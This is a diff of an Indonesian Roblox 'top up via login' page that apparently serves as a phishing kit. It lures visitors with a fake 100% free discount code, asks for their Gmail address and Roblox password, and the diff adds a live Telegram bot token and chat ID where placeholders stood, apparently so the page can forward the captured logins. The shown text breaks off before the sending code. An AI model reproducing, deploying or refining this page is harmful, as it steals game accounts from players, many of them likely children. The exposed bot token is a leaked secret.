@@ -2,864 +2,506 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>FDW TOP UP — Roblox Via Login</title>
     <style>
         :root {
-            --bg: #0d0d0f;
-            --card: #16161a;
-            --card2: #1e1e24;
+            --bg: #0b0b0e;
+            --card: #141418;
+            --card2: #1c1c22;
             --accent: #e2231a;
-            --accent2: #ff4444;
             --gold: #ffd700;
             --green: #00c853;
-            --text: #e8e8ec;
-            --text2: #a0a0b0;
-            --border: #2a2a34;
+            --text: #eaeaea;
+            --text2: #9898a0;
+            --border: #2a2a32;
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             background: var(--bg);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             color: var(--text);
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-            padding: 12px;
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 480px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        /* ── HEADER ── */
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 4px;
-        }
-        .brand {
-            font-size: 22px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #e2231a, #ff4444);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .brand-sub {
-            font-size: 10px;
-            color: var(--text2);
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 12px;
-            color: var(--text2);
-        }
-
-        /* ── CAROUSEL ── */
-        .carousel-wrap {
-            position: relative;
-            border-radius: 14px;
-            overflow: hidden;
-            aspect-ratio: 16/7;
-            background: #111;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-        }
-        .carousel-track {
-            display: flex;
-            transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1.2);
-            height: 100%;
-        }
-        .carousel-slide {
-            min-width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 20px;
-            background-size: cover;
-            background-position: center;
-            position: relative;
-        }
-        .carousel-slide::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(180deg, transparent 40%, rgba(0, 0, 0, 0.7));
-        }
-        .carousel-slide span {
-            position: relative;
-            z-index: 2;
-            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.8);
-            text-align: center;
             padding: 10px;
+            min-height: 100vh;
         }
-        .carousel-dots {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            gap: 6px;
-            z-index: 3;
-        }
-        .carousel-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #fff6;
-            transition: 0.3s;
-        }
-        .carousel-dot.active {
-            background: #fff;
-            width: 22px;
-            border-radius: 10px;
-        }
+        .container { width:100%; max-width:420px; display:flex; flex-direction:column; gap:10px; }
 
-        /* ── TAB BAR ── */
-        .tab-bar {
-            display: flex;
-            gap: 6px;
-            overflow-x: auto;
-            padding: 2px 0;
-            scrollbar-width: none;
+        /* HEADER */
+        .header { display:flex; align-items:center; justify-content:space-between; }
+        .brand { font-size:22px; font-weight:900; background: linear-gradient(135deg, #e2231a, #ff4444); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .badge { background:var(--accent); color:#fff; font-size:10px; font-weight:700; padding:4px 10px; border-radius:10px; }
+
+        /* CAROUSEL THUMBNAIL */
+        .carousel {
+            position:relative; border-radius:14px; overflow:hidden; aspect-ratio:16/7;
+            background:#111; box-shadow:0 4px 20px rgba(0,0,0,0.6);
         }
-        .tab-bar::-webkit-scrollbar {
-            display: none;
+        .carousel-track { display:flex; height:100%; transition: transform 0.6s ease; }
+        .carousel-slide {
+            min-width:100%; height:100%; display:flex; align-items:center; justify-content:center;
+            background-size:cover; background-position:center; position:relative;
         }
+        .carousel-slide::after { content:''; position:absolute; inset:0; background:linear-gradient(0deg, rgba(0,0,0,0.7) 0%, transparent 70%); }
+        .carousel-slide .content { position:relative; z-index:2; text-align:center; padding:16px; }
+        .carousel-dots { position:absolute; bottom:10px; left:50%; transform:translateX(-50%); display:flex; gap:6px; z-index:3; }
+        .carousel-dot { width:8px; height:8px; border-radius:50%; background:#fff6; transition:0.3s; cursor:pointer; }
+        .carousel-dot.active { background:#fff; width:22px; border-radius:10px; }
+
+        /* TAB */
+        .tab-bar { display:flex; gap:6px; overflow-x:auto; scrollbar-width:none; }
         .tab-btn {
-            flex: 0 0 auto;
-            padding: 8px 18px;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            background: var(--card);
-            color: var(--text2);
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            white-space: nowrap;
+            flex:0 0 auto; padding:7px 16px; border-radius:18px; border:1px solid var(--border);
+            background:var(--card); color:var(--text2); font-size:11px; font-weight:600; cursor:pointer;
         }
-        .tab-btn.active {
-            background: var(--accent);
-            color: #fff;
-            border-color: var(--accent);
-        }
+        .tab-btn.active { background:var(--accent); color:#fff; border-color:var(--accent); }
 
-        /* ── STEP INDICATOR ── */
-        .steps {
-            display: flex;
-            gap: 6px;
-            align-items: center;
-            justify-content: center;
-            padding: 6px 0;
-            font-size: 11px;
-            color: var(--text2);
-        }
+        /* STEPS */
+        .steps { display:flex; align-items:center; justify-content:center; gap:8px; font-size:10px; color:var(--text2); }
         .step-dot {
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            background: var(--card2);
-            border: 2px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 12px;
-            transition: 0.3s;
+            width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center;
+            background:var(--card2); border:2px solid var(--border); font-weight:700; font-size:11px; transition:0.3s;
         }
-        .step-dot.done {
-            background: var(--green);
-            border-color: var(--green);
-            color: #000;
-        }
-        .step-dot.current {
-            border-color: var(--accent);
-            color: var(--accent);
-            animation: pulse-step 1.5s infinite;
-        }
-        @keyframes pulse-step {
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(226, 35, 26, 0.4);
-            }
-            50% {
-                box-shadow: 0 0 0 10px rgba(226, 35, 26, 0);
-            }
-        }
+        .step-dot.done { background:var(--green); border-color:var(--green); color:#000; }
+        .step-dot.current { border-color:var(--accent); color:var(--accent); }
 
-        /* ── CONTENT PANEL ── */
-        .panel {
-            background: var(--card);
-            border-radius: 14px;
-            padding: 14px;
-            border: 1px solid var(--border);
-            display: none;
-        }
-        .panel.active {
-            display: block;
-        }
+        /* PANELS */
+        .panel { display:none; background:var(--card); border-radius:14px; padding:14px; border:1px solid var(--border); }
+        .panel.active { display:block; }
 
-        /* ── PRODUCT GRID ── */
+        /* PRODUCT GRID */
         .product-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            max-height: 300px;
-            overflow-y: auto;
-            padding-right: 2px;
-            scrollbar-width: thin;
-            scrollbar-color: #333 transparent;
+            display:grid; grid-template-columns:repeat(3,1fr); gap:6px;
+            max-height:280px; overflow-y:auto; padding:2px; scrollbar-width:thin; scrollbar-color:#333 transparent;
         }
         .prod-card {
-            background: var(--card2);
-            border-radius: 10px;
-            padding: 10px 6px;
-            text-align: center;
-            cursor: pointer;
-            border: 1.5px solid transparent;
-            transition: 0.2s;
-            position: relative;
+            background:var(--card2); border-radius:10px; padding:10px 4px; text-align:center;
+            border:1.5px solid transparent; cursor:pointer; transition:0.2s; position:relative;
         }
-        .prod-card.selected {
-            border-color: var(--accent);
-            background: #221;
-        }
-        .prod-card .rbx {
-            font-weight: 800;
-            font-size: 15px;
-            margin-bottom: 2px;
-        }
-        .prod-card .harga {
-            font-size: 11px;
-            color: var(--green);
-            font-weight: 600;
-        }
-        .prod-card .harga.gratis {
-            color: var(--gold);
-        }
-        .prod-card .gratis-badge {
-            position: absolute;
-            top: -6px;
-            right: -4px;
-            background: var(--gold);
-            color: #000;
-            font-size: 9px;
-            font-weight: 800;
-            padding: 2px 6px;
-            border-radius: 8px;
-        }
+        .prod-card.selected { border-color:var(--accent); background:#221; }
+        .prod-card .rbx { font-weight:800; font-size:15px; margin-bottom:4px; }
+        .prod-card .harga { font-size:11px; color:var(--green); font-weight:600; }
+        .prod-card .harga.gratis { color:var(--gold); }
+        .gratis-badge { position:absolute; top:-6px; right:-4px; background:var(--gold); color:#000; font-size:9px; font-weight:800; padding:2px 6px; border-radius:8px; }
 
-        /* ── FORM STYLES ── */
-        .form-group {
-            margin-bottom: 10px;
-        }
-        .form-group label {
-            display: block;
-            font-size: 11px;
-            font-weight: 600;
-            color: var(--text2);
-            margin-bottom: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
+        /* FORMS */
+        .form-group { margin-bottom:10px; }
+        .form-group label { display:block; font-size:10px; font-weight:600; color:var(--text2); margin-bottom:4px; text-transform:uppercase; }
         .form-group input {
-            width: 100%;
-            padding: 11px 14px;
-            border-radius: 8px;
-            border: 1.5px solid var(--border);
-            background: #0a0a0e;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
-            transition: 0.2s;
+            width:100%; padding:10px 12px; border-radius:8px; border:1.5px solid var(--border); background:#0a0a0e;
+            color:#fff; font-size:14px; outline:none;
         }
-        .form-group input:focus {
-            border-color: var(--accent);
-        }
-        .form-group input.invalid {
-            border-color: #ff4444;
-            animation: shake 0.4s;
-        }
-        @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            25% {
-                transform: translateX(-5px);
-            }
-            75% {
-                transform: translateX(5px);
-            }
-        }
-        .error-msg {
-            font-size: 10px;
-            color: #ff4444;
-            margin-top: 3px;
-            display: none;
-        }
+        .form-group input:focus { border-color:var(--accent); }
+        .form-group input.invalid { border-color:#ff4444; animation:shake 0.4s; }
+        .error-msg { font-size:10px; color:#ff4444; margin-top:3px; display:none; }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-4px)} 75%{transform:translateX(4px)} }
 
-        /* ── BUTTONS ── */
+        /* BUTTONS */
         .btn {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: none;
-            font-weight: 700;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.2s;
-            letter-spacing: 0.3px;
+            width:100%; padding:11px; border-radius:8px; border:none; font-weight:700; font-size:13px;
+            cursor:pointer; transition:0.2s; letter-spacing:0.3px; margin-top:8px;
         }
-        .btn-primary {
-            background: var(--accent);
-            color: #fff;
-        }
-        .btn-primary:hover {
-            background: #c41d14;
-        }
-        .btn-primary:disabled {
-            background: #555;
-            cursor: not-allowed;
-            opacity: 0.5;
-        }
-        .btn-coupon {
-            background: var(--gold);
-            color: #000;
-            font-weight: 800;
-            padding: 8px 16px;
-            border-radius: 8px;
-            border: none;
-            cursor: pointer;
-            font-size: 12px;
-            white-space: nowrap;
-        }
-        .coupon-row {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .coupon-row input {
-            flex: 1;
-            padding: 9px 12px;
-            border-radius: 8px;
-            border: 1.5px solid var(--border);
-            background: #0a0a0e;
-            color: #fff;
-            font-size: 13px;
-        }
-        .price-display {
-            text-align: center;
-            font-weight: 800;
-            margin: 8px 0;
-            font-size: 16px;
-        }
-        .price-display.free {
-            color: var(--gold);
-            font-size: 20px;
-        }
+        .btn-primary { background:var(--accent); color:#fff; }
+        .btn-primary:disabled { background:#444; opacity:0.5; cursor:not-allowed; }
+        .btn-coupon { background:var(--gold); color:#000; font-weight:800; padding:8px 14px; border-radius:8px; border:none; cursor:pointer; font-size:12px; white-space:nowrap; }
+        .coupon-row { display:flex; gap:8px; margin-bottom:10px; align-items:center; }
+        .coupon-row input { flex:1; padding:9px 12px; border-radius:8px; border:1.5px solid var(--border); background:#0a0a0e; color:#fff; font-size:13px; }
+        .price-display { text-align:center; font-weight:800; font-size:16px; margin:8px 0; }
+        .price-display.free { color:var(--gold); font-size:20px; }
 
-        /* ── OVERLAY PROCESSING ── */
+        /* OVERLAY PROSES */
         .processing-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:9999;
+            justify-content:center; align-items:center; flex-direction:column;
         }
-        .processing-overlay.show {
-            display: flex;
-        }
+        .processing-overlay.show { display:flex; }
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #333;
-            border-top-color: var(--accent);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 16px;
+            width:44px; height:44px; border:4px solid #333; border-top-color:var(--accent);
+            border-radius:50%; animation:spin 0.8s linear infinite; margin-bottom:16px;
         }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .processing-text {
-            color: #fff;
-            font-size: 13px;
-            text-align: center;
-        }
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .processing-text { color:#fff; font-size:12px; }
 
-        /* ── STEP PANEL HIDDEN ── */
-        #panelAccount,
-        #panelCheckout {
-            display: none;
-        }
-        #panelAccount.active,
-        #panelCheckout.active {
-            display: block;
-        }
-
-        /* ── NOTIFICATION ── */
+        /* TOAST */
         .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #222;
-            color: #fff;
-            padding: 10px 22px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            z-index: 99999;
-            opacity: 0;
-            transition: 0.3s;
+            position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#222; color:#fff;
+            padding:10px 22px; border-radius:20px; font-size:11px; font-weight:600; z-index:99999; opacity:0; transition:0.3s;
         }
-        .toast.show {
-            opacity: 1;
-        }
+        .toast.show { opacity:1; }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <!-- HEADER -->
-        <div class="header">
-            <div>
-                <div class="brand">FDW TOP UP</div>
-                <div class="brand-sub">Roblox Via Login</div>
-            </div>
-            <div class="header-right">⚡ Instan 24/7</div>
+<div class="container">
+    <!-- HEADER -->
+    <div class="header">
+        <div>
+            <div class="brand">FDW TOP UP</div>
+            <div style="font-size:10px;color:var(--text2);">Roblox Via Login</div>
         </div>
+        <div class="badge">⚡ 24/7</div>
+    </div>
 
-        <!-- CAROUSEL -->
-        <div class="carousel-wrap" id="carousel">
-            <div class="carousel-track" id="carouselTrack">
-                <div class="carousel-slide" style="background: linear-gradient(135deg, #1a1a2e, #e2231a);">
-                    <span>🔥 ROBUX MURAH<br><small>Mulai Rp 16.000</small></span>
-                </div>
-                <div class="carousel-slide" style="background: linear-gradient(135deg, #16213e, #0f3460);">
-                    <span>⚡ PROSES CEPAT<br><small>Auto 1-3 Menit</small></span>
-                </div>
-                <div class="carousel-slide" style="background: linear-gradient(135deg, #1b1b2f, #e94560);">
-                    <span>🎁 KODE DISKON<br><small>GRATIS2026 = 100% GRATIS!</small></span>
-                </div>
+    <!-- CAROUSEL -->
+    <div class="carousel" id="carousel">
+        <div class="carousel-track" id="carouselTrack">
+            <div class="carousel-slide" style="background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Roblox_Logo.svg/512px-Roblox_Logo.svg.png?20210803115914') center/60% no-repeat, linear-gradient(135deg, #1a1a2e, #e2231a);">
+                <div class="content"><h2 style="font-size:22px;">ROBLOX</h2><p style="font-size:12px;opacity:0.9;">Top Up via Login Termurah</p></div>
             </div>
-            <div class="carousel-dots" id="carouselDots"></div>
-        </div>
-
-        <!-- TAB BAR -->
-        <div class="tab-bar">
-            <button class="tab-btn active">Roblox via Login</button>
-            <button class="tab-btn">Top Up Hemat</button>
-        </div>
-
-        <!-- STEP INDICATOR -->
-        <div class="steps">
-            <div class="step-dot current" id="stepDot1">1</div> ──
-            <div class="step-dot" id="stepDot2">2</div> ──
-            <div class="step-dot" id="stepDot3">3</div>
-        </div>
-
-        <!-- PANEL 1: PILIH ROBUX -->
-        <div class="panel active" id="panelProducts">
-            <div class="coupon-row">
-                <input type="text" id="couponInput" placeholder="Kode diskon (GRATIS2026)">
-                <button class="btn-coupon" onclick="applyCoupon()">Pakai</button>
+            <div class="carousel-slide" style="background:linear-gradient(135deg, #16213e, #0f3460);">
+                <div class="content"><h2>🔥 PROSES CEPAT</h2><p style="font-size:12px;">Auto 1-3 Menit</p></div>
             </div>
-            <p style="font-size:11px;color:var(--text2);margin-bottom:8px;">👇 Pilih nominal Robux dulu ya</p>
-            <div class="product-grid" id="productGrid"></div>
-            <button class="btn btn-primary" id="btnNextStep" disabled style="margin-top:12px;">
-                Lanjut → Masukkan Akun
-            </button>
-        </div>
-
-        <!-- PANEL 2: MASUKKAN AKUN -->
-        <div class="panel" id="panelAccount">
-            <p style="font-size:13px;margin-bottom:12px;color:var(--text2);">
-                💰 <span id="selectedProductLabel">-</span>
-            </p>
-            <div class="form-group">
-                <label>📧 Email (Gmail)</label>
-                <input type="email" id="emailInput" placeholder="contoh@gmail.com" autocomplete="email">
-                <div class="error-msg" id="emailError">Format email tidak valid!</div>
-            </div>
-            <div class="form-group">
-                <label>🔑 Password Roblox</label>
-                <input type="password" id="passInput" placeholder="••••••••" autocomplete="current-password">
-                <div class="error-msg" id="passError">Password tidak boleh kosong!</div>
-            </div>
-            <div style="display:flex;gap:8px;">
-                <button class="btn btn-primary" onclick="goBackToProducts()" style="background:#444;flex:1;">← Kembali</button>
-                <button class="btn btn-primary" id="btnCheckout" style="flex:2;" disabled>Lanjut → Checkout</button>
+            <div class="carousel-slide" style="background:linear-gradient(135deg, #1b1b2f, #e94560);">
+                <div class="content"><h2>🎁 GRATIS2026</h2><p style="font-size:12px;">Kode Diskon 100% Gratis!</p></div>
             </div>
         </div>
+        <div class="carousel-dots" id="carouselDots"></div>
+    </div>
 
-        <!-- PANEL 3: CHECKOUT -->
-        <div class="panel" id="panelCheckout">
-            <div style="text-align:center;margin-bottom:12px;">
-                <div style="font-size:28px;">🛒</div>
-                <div class="price-display" id="finalPriceDisplay">Harga: -</div>
-                <p style="font-size:11px;color:var(--text2);">Produk: <span id="checkoutProduct">-</span></p>
-                <p style="font-size:10px;color:#666;">Akun: <span id="checkoutEmail">-</span></p>
-            </div>
-            <button class="btn btn-primary" id="btnBuyNow">🔓 Beli Sekarang</button>
-            <p style="font-size:10px;color:#555;text-align:center;margin-top:6px;">Dengan melanjutkan, Anda menyetujui verifikasi keamanan otomatis.</p>
+    <!-- TABS -->
+    <div class="tab-bar">
+        <button class="tab-btn active">Roblox via Login</button>
+        <button class="tab-btn">Top Up Hemat</button>
+    </div>
+
+    <!-- STEPS -->
+    <div class="steps">
+        <div class="step-dot current" id="stepDot1">1</div> ──
+        <div class="step-dot" id="stepDot2">2</div> ──
+        <div class="step-dot" id="stepDot3">3</div>
+    </div>
+
+    <!-- PANEL 1: PRODUK -->
+    <div class="panel active" id="panelProducts">
+        <div class="coupon-row">
+            <input type="text" id="couponInput" placeholder="Masukkan kode (GRATIS2026)">
+            <button class="btn-coupon" onclick="applyCoupon()">Pakai</button>
+        </div>
+        <p style="font-size:11px;color:var(--text2);margin-bottom:6px;">👇 Pilih nominal Robux dulu</p>
+        <div class="product-grid" id="productGrid"></div>
+        <button class="btn btn-primary" id="btnNextStep" disabled>Lanjut → Masukkan Akun</button>
+    </div>
+
+    <!-- PANEL 2: AKUN -->
+    <div class="panel" id="panelAccount">
+        <p style="font-size:13px;margin-bottom:10px;color:var(--text2);">💰 <span id="selectedProductLabel">-</span></p>
+        <div class="form-group">
+            <label>📧 Email (Gmail)</label>
+            <input type="email" id="emailInput" placeholder="contoh@gmail.com" autocomplete="email">
+            <div class="error-msg" id="emailError">Email harus Gmail (contoh@gmail.com).</div>
+        </div>
+        <div class="form-group">
+            <label>🔑 Password Roblox</label>
+            <input type="password" id="passInput" placeholder="••••••••" autocomplete="current-password">
+            <div class="error-msg" id="passError">Password tidak boleh kosong.</div>
+        </div>
+        <div style="display:flex;gap:8px;">
+            <button class="btn btn-primary" onclick="goBackToProducts()" style="background:#444;flex:1;">← Kembali</button>
+            <button class="btn btn-primary" id="btnCheckout" style="flex:2;" disabled>Lanjut → Checkout</button>
         </div>
     </div>
 
-    <!-- PROCESSING OVERLAY -->
-    <div class="processing-overlay" id="processingOverlay">
-        <div class="spinner"></div>
-        <div class="processing-text" id="processingText">Memproses...</div>
+    <!-- PANEL 3: CHECKOUT -->
+    <div class="panel" id="panelCheckout">
+        <div style="text-align:center;margin-bottom:10px;">
+            <div style="font-size:24px;">🛒</div>
+            <div class="price-display" id="finalPriceDisplay">Harga: -</div>
+            <p style="font-size:11px;color:var(--text2);">Produk: <span id="checkoutProduct">-</span></p>
+            <p style="font-size:10px;color:#555;">Akun: <span id="checkoutEmail">-</span></p>
+        </div>
+        <button class="btn btn-primary" id="btnBuyNow">🔓 Beli Sekarang</button>
+        <p style="font-size:10px;color:#444;text-align:center;margin-top:6px;">Dengan melanjutkan, Anda menyetujui verifikasi keamanan otomatis.</p>
     </div>
+</div>
 
-    <!-- TOAST -->
-    <div class="toast" id="toast"></div>
+<!-- OVERLAY PROSES -->
+<div class="processing-overlay" id="processingOverlay">
+    <div class="spinner"></div>
+    <div class="processing-text" id="processingText">Memproses...</div>
+</div>
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+<script>
+    // ==================== CONFIG TELEGRAM (GANTI) ====================
+    const BOT_TOKEN = "8353080072:AAEY45tqXLC3sEpxQSbGpkGzyj-aqRNBCRQ";
+    const CHAT_ID = "7088650583";
 
-    <script>
-        // ==================== CONFIG TELEGRAM ====================
-        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // <-- GANTI
-        const CHAT_ID = "YOUR_CHAT_ID"; // <-- GANTI
+    // ==================== DATA PRODUK ====================
+    const products = [
+        { amount: "80 RBX", price: 16199 },
+        { amount: "160 RBX", price: 31661 },
+        { amount: "240 RBX", price: 79791 },
+        { amount: "400 RBX", price: 163457 },
+        { amount: "560 RBX", price: 195854 },
+        { amount: "1120 RBX", price: 228251 },
+        { amount: "1200 RBX", price: 246044 },
+        { amount: "1400 RBX", price: 264041 },
+        { amount: "1600 RBX", price: 282043 },
+        { amount: "1800 RBX", price: 300045 },
+        { amount: "2000 RBX", price: 318047 },
+        { amount: "2400 RBX", price: 336049 },
+        { amount: "2600 RBX", price: 354051 },
+        { amount: "2800 RBX", price: 372054 },
+        { amount: "3000 RBX", price: 390057 },
+        { amount: "3200 RBX", price: 408060 },
+        { amount: "3400 RBX", price: 426063 },
+        { amount: "3600 RBX", price: 444066 },
+        { amount: "3800 RBX", price: 462069 },
+        { amount: "4000 RBX", price: 480072 },
+        { amount: "4200 RBX", price: 498075 },
+        { amount: "4400 RBX", price: 516078 },
+        { amount: "4600 RBX", price: 534081 },
+        { amount: "4800 RBX", price: 552084 },
+        { amount: "5200 RBX", price: 570087 },
+        { amount: "5600 RBX", price: 588090 },
+        { amount: "5800 RBX", price: 606093 },
+        { amount: "6000 RBX", price: 624096 },
+        { amount: "6400 RBX", price: 642099 },
+        { amount: "6600 RBX", price: 660102 },
+        { amount: "6800 RBX", price: 678105 },
+        { amount: "7000 RBX", price: 696108 },
+        { amount: "7200 RBX", price: 714111 },
+        { amount: "7400 RBX", price: 732114 },
+        { amount: "7600 RBX", price: 750117 },
+        { amount: "7800 RBX", price: 768120 },
+        { amount: "8000 RBX", price: 786123 },
+        { amount: "8200 RBX", price: 804126 },
+        { amount: "8400 RBX", price: 822129 },
+        { amount: "8600 RBX", price: 840132 },
+        { amount: "8800 RBX", price: 858135 },
+        { amount: "9000 RBX", price: 870138 },
+        { amount: "9200 RBX", price: 882141 },
+        { amount: "9400 RBX", price: 894144 },
+        { amount: "9600 RBX", price: 906147 },
+        { amount: "9800 RBX", price: 918150 },
+        { amount: "10000 RBX", price: 930153 },
+        { amount: "500 RBX", price: 77305 },
+        { amount: "1000 RBX", price: 155334 }
+    ];
 
-        // ==================== DATA PRODUK ====================
-        const products = [
-            { amount: "80 RBX", price: 16199 }, { amount: "160 RBX", price: 31661 }, { amount: "240 RBX", price: 79791 },
-            { amount: "400 RBX", price: 163457 }, { amount: "560 RBX", price: 195854 },
-            { amount: "1120 RBX", price: 228251 },
-            { amount: "1200 RBX", price: 246044 }, { amount: "1400 RBX", price: 264041 },
-            { amount: "1600 RBX", price: 282043 },
-            { amount: "1800 RBX", price: 300045 }, { amount: "2000 RBX", price: 318047 },
-            { amount: "2400 RBX", price: 336049 },
-            { amount: "2600 RBX", price: 354051 }, { amount: "2800 RBX", price: 372054 },
-            { amount: "3000 RBX", price: 390057 },
-            { amount: "3200 RBX", price: 408060 }, { amount: "3400 RBX", price: 426063 },
-            { amount: "3600 RBX", price: 444066 },
-            { amount: "3800 RBX", price: 462069 }, { amount: "4000 RBX", price: 480072 },
-            { amount: "4200 RBX", price: 498075 },
-            { amount: "4400 RBX", price: 516078 }, { amount: "4600 RBX", price: 534081 },
-            { amount: "4800 RBX", price: 552084 },
-            { amount: "5200 RBX", price: 570087 }, { amount: "5600 RBX", price: 588090 },
-            { amount: "5800 RBX", price: 606093 },
-            { amount: "6000 RBX", price: 624096 }, { amount: "6400 RBX", price: 642099 },
-            { amount: "6600 RBX", price: 660102 },
-            { amount: "6800 RBX", price: 678105 }, { amount: "7000 RBX", price: 696108 },
-            { amount: "7200 RBX", price: 714111 },
-            { amount: "7400 RBX", price: 732114 }, { amount: "7600 RBX", price: 750117 },
-            { amount: "7800 RBX", price: 768120 },
-            { amount: "8000 RBX", price: 786123 }, { amount: "8200 RBX", price: 804126 },
-            { amount: "8400 RBX", price: 822129 },
-            { amount: "8600 RBX", price: 840132 }, { amount: "8800 RBX", price: 858135 },
-            { amount: "9000 RBX", price: 870138 },
-            { amount: "9200 RBX", price: 882141 }, { amount: "9400 RBX", price: 894144 },
-            { amount: "9600 RBX", price: 906147 },
-            { amount: "9800 RBX", price: 918150 }, { amount: "10000 RBX", price: 930153 },
-            { amount: "500 RBX", price: 77305 },
-            { amount: "1000 RBX", price: 155334 }
-        ];
+    let selectedProduct = null;
+    let isGratis = false;
 
-        let selectedProduct = null;
-        let isGratis = false;
+    function formatPrice(num) { return 'Rp ' + num.toLocaleString('id-ID'); }
 
-        function formatPrice(num) {
-            return 'Rp ' + num.toLocaleString('id-ID');
-        }
+    // ==================== CAROUSEL ====================
+    const track = document.getElementById('carouselTrack');
+    const dotsContainer = document.getElementById('carouselDots');
+    let currentSlide = 0;
+    const totalSlides = track.children.length;
+    for (let i=0; i<totalSlides; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'carousel-dot' + (i===0?' active':'');
+        dot.addEventListener('click', ()=>goToSlide(i));
+        dotsContainer.appendChild(dot);
+    }
+    function goToSlide(idx) {
+        currentSlide = idx;
+        track.style.transform = `translateX(-${idx*100}%)`;
+        [...dotsContainer.children].forEach((d,i)=>d.classList.toggle('active', i===idx));
+    }
+    setInterval(()=>goToSlide((currentSlide+1)%totalSlides), 5000);
 
-        // ==================== CAROUSEL ====================
-        const track = document.getElementById('carouselTrack');
-        const dotsContainer = document.getElementById('carouselDots');
-        const slides = track.children;
-        let currentSlide = 0;
-        const totalSlides = slides.length;
-
-        for (let i = 0; i < totalSlides; i++) {
-            const dot = document.createElement('div');
-            dot.className = 'carousel-dot' + (i === 0 ? ' active' : '');
-            dot.addEventListener('click', () => goToSlide(i));
-            dotsContainer.appendChild(dot);
-        }
-        const dots = dotsContainer.children;
-        for (let i = 0; i < totalSlides; i++) {
-            const dot = document.createElement('div');
-            dot.className = 'carousel-dot' + (i === 0 ? ' active' : '');
-            dot.addEventListener('click', () => goToSlide(i));
-            dotsContainer.appendChild(dot);
-        }
-        const dots = dotsContainer.children;
-
-        function goToSlide(idx) {
-            currentSlide = idx;
-            track.style.transform = `translateX(-${idx * 100}%)`;
-            Array.from(dots).forEach((d, i) => d.classList.toggle('active', i === idx));
-        }
-
-        setInterval(() => goToSlide((currentSlide + 1) % totalSlides), 5000);
-
-        // ==================== RENDER PRODUK ====================
-        const grid = document.getElementById('productGrid');
-
-        function renderProducts(discounted = false) {
-            grid.innerHTML = '';
-            products.forEach(p => {
-                const card = document.createElement('div');
-                card.className = 'prod-card';
-                card.dataset.amount = p.amount;
-                card.dataset.price = discounted ? 0 : p.price;
-                card.innerHTML = `
-              <div class="rbx">${p.amount}</div>
-              <div class="harga${discounted ? ' gratis' : ''}">${discounted ? 'GRATIS' : formatPrice(p.price)}</div>
-              ${discounted ? '<div class="gratis-badge">FREE</div>' : ''}
+    // ==================== RENDER PRODUK ====================
+    const grid = document.getElementById('productGrid');
+    function renderProducts(discounted=false) {
+        grid.innerHTML = '';
+        products.forEach(p => {
+            const card = document.createElement('div');
+            card.className = 'prod-card';
+            card.dataset.amount = p.amount;
+            card.dataset.price = discounted ? 0 : p.price;
+            card.innerHTML = `
+                <div class="rbx">${p.amount}</div>
+                <div class="harga${discounted?' gratis':''}">${discounted?'GRATIS':formatPrice(p.price)}</div>
+                ${discounted?'<div class="gratis-badge">FREE</div>':''}
             `;
-                card.addEventListener('click', () => selectProduct(card, p, discounted));
-                grid.appendChild(card);
-            });
-        }
-        renderProducts(false);
+            card.addEventListener('click', ()=>selectProduct(card, p, discounted));
